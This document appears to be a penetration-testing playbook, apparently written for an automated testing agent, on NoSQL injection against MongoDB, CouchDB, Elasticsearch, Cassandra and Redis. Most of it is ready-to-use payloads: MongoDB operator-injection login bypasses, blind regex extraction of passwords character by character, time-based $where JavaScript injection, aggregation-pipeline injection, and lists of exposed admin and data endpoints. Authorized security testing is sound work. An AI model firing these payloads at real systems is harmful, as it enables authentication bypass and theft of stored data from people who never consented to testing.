# NoSQL Injection (Mongo / Cassandra / Couch / Elasticsearch / Redis)

> Different syntax than SQLi but the same principle: untrusted input
> reaches the query layer. Always test JSON-bodied auth + search endpoints.

---

## Phase 1: Detect the Backend

Errors leak the engine fast:
| Engine | Error fingerprint |
|--------|-------------------|
| MongoDB | `MongoError`, `BSONError`, `unknown operator`, `$where requires`, `bad query` |
| CouchDB | `error: bad_request`, `reason: invalid UTF-8 JSON` |
| Elasticsearch | `parse_exception`, `query_shard_exception`, `mapper_parsing_exception` |
| Cassandra | `SyntaxException`, `InvalidRequestException` |
| Redis | `WRONGTYPE`, `(error) ERR` |

Probes:
- `'` (most engines tolerate)
- `"` (mongo: stringly typed in JSON)
- `;` (newline-separated commands in some)
- `{}` and `[]` body fragments — backends differ

---

## Phase 2: MongoDB-Specific Payloads (most common)

### 2.1 Auth bypass — operator injection
Login endpoint takes `{"username": "...", "password": "..."}`:

```json
// Always-true on either side
{"username": {"$ne": null}, "password": {"$ne": null}}

// Match any user
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// Regex bypass
{"username": "admin", "password": {"$regex": "^.*"}}

// Specific user, any password
{"username": "admin", "password": {"$ne": "x"}}
```

For form-encoded bodies the operator-injection trick uses bracket syntax:
```
username[$ne]=null&password[$ne]=null
username=admin&password[$regex]=.*
```

### 2.2 Blind boolean — char-by-char extraction
```json
{"username":"admin","password":{"$regex":"^a.*"}}
{"username":"admin","password":{"$regex":"^b.*"}}
...
```
The "true" condition gives a different response (login succeeds /
different status / different length). Use `capture_baseline` +
`diff_against_baseline` here — no other reliable signal.

### 2.3 $where (JS code injection in old Mongo)
```json
{"$where": "this.username == 'admin' && sleep(5000)"}
{"$where": "function(){var r=this.username; r;return 1==1}"}
```
Time-based confirmation: 5s delay → injection confirmed.

### 2.4 Aggregation pipeline injection
If user input lands in a `$match`/`$lookup`:
```json
{"$lookup": {"from": "users", "localField": "_id", "foreignField": "owner", "as": "leak"}}
```

---

## Phase 3: Elasticsearch
- Query string injection in `q=`: `q=*&pretty&filter_path=`
- Script injection in scoring (older versions): `"script": {"lang":"painless","source":"..."}`
- Path-based info disclosure: `/_cat/indices`, `/_cluster/health`, `/_search?q=*`

---

## Phase 4: CouchDB
- `_all_docs?include_docs=true` (if exposed)
- `/db/_design/<id>/_view/<view>?startkey=...&endkey=...`
- Admin endpoints: `/_membership`, `/_node/_local/_config`

---

## Phase 5: Verification

For NoSQL auth bypass, the validator should:
1. Replay the operator-injection payload — does login still succeed?
2. Counter-probe: send a payload with operators that should be rejected
   (`{"$nope": null}`) — server should error or 401. If THAT also works,
   the endpoint wasn't actually checking creds at all (different bug).
3. Vary the username (different valid user, invalid user) to confirm the
   bypass is general, not coincidental.

For blind-boolean, the validator confirms the diff is reproducible across
multiple known-true and known-false payloads.
